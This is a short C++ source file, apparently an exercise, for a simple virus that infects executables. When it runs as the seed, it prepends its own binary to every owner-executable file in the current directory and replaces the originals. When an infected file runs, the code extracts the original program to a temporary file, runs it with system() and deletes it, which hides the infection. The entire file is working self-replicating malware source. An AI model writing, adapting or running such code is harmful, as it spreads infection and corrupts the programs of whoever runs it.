#include <iostream>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/types.h>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>

#define SIZE 41040 //size of virus

using namespace std;
namespace fs = std::filesystem;

int main(int argc, char *argv[]){

    ifstream self(argv[0], ios::binary);
    if (!self.is_open()) perror("self open");
    
    self.seekg(0, ios::end);
    size_t size = self.tellg();
    self.seekg(0, ios::beg);

    // Virus code
    cout << "I'm a virus" << endl;

    if (size != SIZE){ // Infected file
        ofstream victim("tmpfile", ios::binary);
        self.seekg(SIZE, ios::beg);
        victim << self.rdbuf();
        victim.close();
        system("chmod +x tmpfile");
        system("./tmpfile");
        system("rm tmpfile");
    }
    else{ // Seed virus
        for (auto &p : fs::directory_iterator(fs::current_path())){
            if (fs::is_regular_file(p.path()) &&
                p.path().filename() != argv[0] &&
                (fs::status(p.path()).permissions() & fs::perms::owner_exec) != fs::perms::none){
                cout << "Found to be infected: " << p.path().string() << endl;
                string tmpfile = p.path().string() + ".tmpfile";
                ifstream victim(p.path(), ios::binary);
                ofstream infected(tmpfile, ios::binary);
                infected << self.rdbuf() << victim.rdbuf();
                infected.close();
                victim.close();
                fs::permissions(p.path(), fs::status(p.path()).permissions());
                remove(p.path().c_str());
                rename(tmpfile.c_str(), p.path().c_str());
            }
        }
    }
    self.close();
    return 0;
}
